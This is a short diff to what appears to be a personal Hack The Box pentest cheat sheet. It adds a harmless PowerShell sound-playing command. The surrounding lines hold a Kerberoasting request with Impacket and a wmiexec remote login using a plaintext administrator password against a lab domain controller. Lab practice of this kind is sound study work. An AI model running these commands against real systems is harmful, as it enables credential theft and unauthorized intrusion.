@@ -310,6 +310,9 @@ KERBEROASTING
 python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.145.201 -request
 python /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.145.201
 
+PLAY SOUND FILE ON WINDOW
+powershell -c (New-Object Media.SoundPlayer "http://localhost:7878/r2d2.wav").Play(); Start-Sleep -s 5; Exit;
+
 BACKUP
 scp -r htb-lawinn@htb-uccb72lwbw.htb-cloud.com:/home/htb-lawinn/my_data G:\Pentest\HTB\my_data
 
